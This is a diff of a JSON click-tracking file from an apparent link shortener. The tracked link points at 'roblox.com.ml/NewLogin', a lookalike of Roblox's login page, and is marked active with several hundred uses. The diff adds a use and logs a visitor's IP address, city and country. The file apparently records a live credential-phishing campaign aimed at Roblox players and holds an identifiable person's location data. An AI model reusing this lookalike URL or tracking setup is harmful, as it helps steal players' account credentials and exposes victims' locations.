@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 468,
+    "useCount": 469,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3851,6 +3851,14 @@
       },
       {
         "timestamp": 1777071901042,
+        "ip": "49.228.179.130",
+        "country": "Thailand",
+        "city": "Khon Kaen",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777071916520,
         "ip": "49.228.179.130",
         "country": "Thailand",
         "city": "Khon Kaen",
